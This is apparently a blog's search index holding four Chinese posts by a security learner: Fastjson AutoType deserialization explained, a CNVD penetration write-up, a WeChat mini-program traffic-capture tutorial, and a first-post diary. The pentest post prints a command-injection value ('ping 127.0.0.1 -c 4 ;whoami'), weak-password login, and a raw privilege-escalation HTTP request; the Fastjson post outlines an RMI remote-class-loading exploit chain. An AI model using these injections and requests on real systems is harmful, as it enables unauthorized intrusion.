<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Fastjson的原理</title>
      <link href="/2024/06/22/Fastjson%E7%9A%84%E5%8E%9F%E7%90%86/"/>
      <url>/2024/06/22/Fastjson%E7%9A%84%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>是什么</p><p>json：Json是一种轻量级的数据交换格式，应该在一个程序员的开发生涯中是常接触的。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​        &quot;name&quot;:&quot;BossFrank&quot;,</span><br><span class="line"></span><br><span class="line">​        &quot;age&quot;:23,</span><br><span class="line"></span><br><span class="line">​        &quot;media&quot;:[&quot;CSDN&quot;,&quot;bilibili&quot;,&quot;Github&quot;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Fastjson：是一个Java库，可用于将Java对象转换为其JSON表示。它还可用于将JSON字符串转换为等效的Java对象。<strong>Fastjson可以处理任意Java对象，包括您没有源代码的预先存在的对象</strong>。</p><p>Fastjson漏洞的形成</p><p><strong>fastjson的漏洞本质还是一个java的<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">反序列化漏洞</a>，由于引进了AutoType功能，fastjson在对json字符串反序列化的时候，会读取到@type的内容，将json内容反序列化为java对象并调用这个类的setter方法。</strong></p><p><strong>fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制</strong></p><p>对于JSON框架来说，想要把一个Java对象转换成字符串有两种方法</p><p>1.基于setter&#x2F;getter</p><p>2.基于属性（AutoType）</p><p>基于setter&#x2F;getter</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Apple implements Fruit &#123;</span><br><span class="line">    private Big_Decimal price;</span><br><span class="line">    //省略 setter/getter、toString等</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class iphone implements Fruit &#123;</span><br><span class="line">    private Big_Decimal price;</span><br><span class="line">    //省略 setter/getter、toString等</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当一个类只有一个接口的时候，将这个类的对象序列化的时候，就会将子类抹去，只保留接口的类型，最后导致反序列化时无法得到原始类型。本例中，将两个json再反序列化生成java对象的时候，无法区分原始类是否是别的子类。</p><p>基于AutoType</p><p>为了解决上述问题： fastjson引入了基于属性（AutoType），即在序列化的时候，先把原始类型记录下来<br>{ “fruit”:{ “@type”:”com.hollis.lab.fastjson.test.Apple”, “price”:0.5 } }</p><p>引入AutoType后，iphone类对象序列化为json格式后为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; &quot;fruit&quot;:&#123; &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.iphone&quot;, &quot;price&quot;:5000 &#125; &#125;</span><br></pre></td></tr></table></figure><p>漏洞原理</p><p>使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。</p><p>漏洞利用流程</p><p>攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。<br>存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，靶机服务器就会向rmi服务器请求待执行的命令。也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令啊？<br>rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell啥的）rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。<br>靶机服务器执行了恶意代码，被攻击者成功利用。<br><img src="/2024/06/22/Fastjson%E7%9A%84%E5%8E%9F%E7%90%86/Users\31055\Desktop\fastjosn\1719025936008.png" alt="1719025936008"></p><p>拓展：</p><p>fastjson不出网怎么利用</p><p>apache-BCEL，直接传入字节码不需要出网就可执行恶意代码但是需要引入tomcat的依赖，但在实际攻击中还算是比较常见的。</p><p>fastjson不出网利用<br>fastjson≤1.2.24</p><p>条件:BasicDataSource只需要有dbcp或tomcat-dbcp的依赖即可，dbcp即数据库连接池，在java中用于管理数据库连接，还是挺常见的。</p><p>参考链接：</p><p><a href="https://blog.csdn.net/Bossfrank?type=blog">Boss_frank-CSDN博客</a></p><p>[fastjson反序列化漏洞演示加详细讲解加原理_哔哩哔哩_bilibili</p><p><a href="https://blog.csdn.net/weixin_49248030/article/details/127989449">fastjson-BCEL不出网打法原理分析_fastjson不出网是什么-CSDN博客</a>](<a href="https://www.bilibili.com/video/BV1Ab4y1d7w1/?vd_source=e52c0be348f431bd52ecb6f73987ebbd">https://www.bilibili.com/video/BV1Ab4y1d7w1/?vd_source=e52c0be348f431bd52ecb6f73987ebbd</a>)</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 框架漏洞 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次cnvd渗透</title>
      <link href="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/"/>
      <url>/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>前言：挖src挖郁闷了，闲来无事选择挖一个cnvd来练练手，本次的漏洞都没啥难度，企查查资产过了5000万</p><p>说一下cnvd证书的下放标准</p><p>对于中危及中危以上通用型漏洞（CVSS2.0基准评分超过4.0分），以及涉及党政机关、重要行业单位、科研院所、重要企事业单位（如：中央国有大型企业、部委直属事业单位等）的高危事件型漏洞(后续对事件型漏洞证明颁发标准将参考中央网信办颁布的关键基础设施相关定义和分类)，CNVD将给予原创漏洞证明（即CNVD漏洞证书，电子版），该证明可通过编号在CNVD官方网站进行查询跟踪。时限要求：按周对上一周归档漏洞且满足证书颁发条件的进行批量制作。</p><p>事件型：高危 重要机构<br>通用型：中危及以上（评分4.0） 注册资金5000w以上，黑盒的测试案例10或以上（3复现+7其他案例，其他案例不要求复现），白盒的得有源码以及提供漏洞处代码调试过程，包含截图和原因。</p><p>过程：</p><p>fofa寻找目标</p><p>app&#x3D;”xx目标系统”</p><p><img src="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552039297.png" alt="1717552039297"></p><p>admin ,123456 成功登录管理员用户（弱口令yyds）</p><p>RCE</p><p><img src="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552211132.png" alt="1717552211132"></p><p>发现这里有一个ping 的功能，我想这里应该会存在rce漏洞</p><p>ping 127.0.0.1 -c 4 ;whoami （成功rce）</p><p><img src="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552367582.png" alt="1717552367582"></p><p><img src="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552712988.png" alt="1717552712988"></p><p><img src="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717553182331.png" alt="1717553182331"></p><p>越权</p><p>&#96;POST xxxxxxxxx        HTTP&#x2F;1.1<br>Host: xxxxx<br>Content-Length: 180<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;125.0.0.0 Safari&#x2F;537.36<br>Content-Type: application&#x2F;json;charset&#x3D;UTF-8<br>Origin: xxxxxxxxxxxxxxxxxxxx<br>Referer: xxxxxxxxxxxxxxxx<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q&#x3D;0.9<br>Connection: close</p><p>{“jsonrpc”:”2.0”,”method”:”call”,”params”:[“635F7A20A38A4072899C14B3535CFBF5”,”admin”,”sessionAddUser”,{“username”:”123456”,”password”:”554e36b4db2bc61b606ca16e756b1f7d”}],”id”:11}&#96;</p><p>这里将admin，换成任意用户即可添加成功</p><p><img src="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717553127082.png" alt="1717553127082"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透实例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNVD </tag>
            
            <tag> 越权 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序抓包详细教程</title>
      <link href="/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/"/>
      <url>/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>前言：关于小程序抓包一直想写出一个比较详细的教程</p><p>实验设备：</p><p>​微信: <a href="https://windows.weixin.qq.com/?lang=zh_CN">https://windows.weixin.qq.com/?lang=zh_CN</a></p><p>​Proxifier：<a href="https://www.proxifier.com/download/">https://www.proxifier.com/download/</a>   (需要挂梯子访问下载)</p><p>​burpsuite：<a href="https://portswigger.net/burp/communitydownload">https://portswigger.net/burp/communitydownload</a> (这里链接的是社区版的，破解版可以去吾爱下载)</p><p>上续操作都完成</p><p>1.打开proxifier portable -&gt;profile -&gt; proxy servers-&gt;add  -&gt;添加本地的端口和ip，选择https</p><p>2.打开proxifier portable -&gt;profile -&gt;proxification rules   -&gt;这里需要配置一些规则</p><p><img src="/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%851.png" alt="小程序抓包1">)</p><p>3.设置-&gt;网络和internet-&gt;手动设置代理-&gt;编辑-&gt;将burp的代理端口配置上去（这里默认你的burp已经装好，证书已经导到浏览器）</p><p>4.burp设置 (正常配置即可)</p><p>实例演示：</p><p>微信打开小米汽车的小程序</p><p>在登录的同时抓包，正常抓包</p><hr><p><img src="/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%852.png" alt="小程序抓包2"></p><p>原理：proxifier portable代理了本机全部流量，用规则只保留微信和小程序的流量，按正常配置可以抓到本机任意流量，将流量导入burp,由burp来控制流量</p><p>自己试试看，你也能做到~~~</p>]]></content>
      
      
      <categories>
          
          <category> 关于抓包两三事 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序抓包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一个博客发表啦</title>
      <link href="/2024/06/02/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/06/02/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>今天是2024年6月2日，终于整好了这个博客，太开心了。会在上面记录自己一年的点点滴滴，一年的时间我会成为什么样子呢？应该会成为一个挖掘src的小case吧，也或许成功升本成功，再就是一个什么也不会的安服。</p><p>加油~</p>]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> 成长 </tag>
            
            <tag> 反省 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
